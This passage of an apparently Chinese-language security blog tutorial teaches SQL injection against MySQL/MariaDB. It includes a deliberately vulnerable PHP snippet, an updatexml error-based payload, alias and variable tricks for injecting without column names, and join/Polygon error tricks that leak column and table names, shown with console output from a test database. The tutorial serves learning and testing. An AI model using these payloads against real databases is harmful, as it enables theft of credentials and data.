</span></span><span class=line><span class=cl><span class=nv>$table</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;table&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;desc shop_</span><span class=si>{</span><span class=nv>$table</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;DESC 出错:&#34;</span><span class=o>.</span><span class=nx>mysql_error</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s2>&#34;select * from `shop_</span><span class=si>{</span><span class=nv>$table</span><span class=si>}</span><span class=s2>` where 1=1&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$sql</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>mysql_fetch_array</span><span class=p>(</span><span class=nx>mysql_query</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$sql</span><span class=s2>&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>mysql_error</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>payload :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23`
</span></span></code></pre></td></tr></table></div></div><p>sql 语句：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=o>`</span><span class=n>shop_user</span><span class=o>`</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x5e24</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>()),</span><span class=mi>0</span><span class=n>x5e24</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=o>#``</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=https://blogpic.zdy.one/img/20190610007624.jpg loading=lazy></p><h3 id=无列名注入>无列名注入</h3><h4 id=别名>别名</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=n>a</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=n>b</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>3</span><span class=p>)</span><span class=k>c</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---+---+---+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---+---+---+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---+---+---+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>000</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=n>a</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=n>b</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>3</span><span class=p>)</span><span class=k>c</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---+--------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---+--------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>hasaki</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>hasaki</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>666</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=mi>2333</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>---+--------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=n>a</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=n>b</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>3</span><span class=p>)</span><span class=k>c</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=p>)</span><span class=n>e</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>hasaki</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>2333</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=n>a</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=n>b</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>3</span><span class=p>)</span><span class=k>c</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=p>)</span><span class=n>e</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>offset</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>2333</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>2</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>000</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=n>a</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=p>)</span><span class=n>b</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>3</span><span class=p>)</span><span class=k>c</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=p>)</span><span class=n>e</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>offset</span><span class=w> </span><span class=mi>3</span><span class=p>),</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>2333</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=mi>2</span><span class=w>        </span><span class=o>|</span><span class=w> </span><span class=mi>3</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>2</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=变量>变量</h4><p>使用变量需要执行两次<code>sql</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=o>@</span><span class=n>a</span><span class=p>,</span><span class=o>@</span><span class=n>b</span><span class=p>,</span><span class=o>@</span><span class=k>c</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Query</span><span class=w> </span><span class=n>OK</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=n>affected</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>@</span><span class=n>a</span><span class=p>,</span><span class=o>@</span><span class=n>b</span><span class=p>,</span><span class=o>@</span><span class=k>c</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>    </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>002</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=可报错时爆表名字段名库名>可报错时爆表名、字段名、库名</h3><h4 id=字段名>字段名</h4><p>上文介绍可以使用无列名注入，但是如果再进行限制，不允许使用<code>union</code>该怎么破呢？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>b</span><span class=p>)</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=k>c</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1060</span><span class=w> </span><span class=p>(</span><span class=mi>42</span><span class=n>S21</span><span class=p>):</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>把当前表第一个字段成功爆出来了。这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用<code>join</code>把表扩充成两份，在最后别名 c 的时候查询到重复字段，就成功报错。</p><p>同时，可以利用<code>using</code>爆其他字段：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>using</span><span class=p>(</span><span class=n>id</span><span class=p>))</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=k>c</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1060</span><span class=w> </span><span class=p>(</span><span class=mi>42</span><span class=n>S21</span><span class=p>):</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;username&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>using</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=n>username</span><span class=p>))</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=k>c</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1060</span><span class=w> </span><span class=p>(</span><span class=mi>42</span><span class=n>S21</span><span class=p>):</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;passwd&#39;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=表名>表名</h4><p>Mysql 文档中有一个函数：</p><p>Polygon(ls1, ls2, …)</p><p><code>Polygon</code>从多个<code>LineString</code>或<code>WKB LineString</code>参数 构造一个值 。如果任何参数不表示<code>LinearRing</code>（也就是说，不是一个封闭和简单的<code>LineString</code>），返回值就是 NULL</p><p>如果传参不是<code>linestring</code>的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>Polygon</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
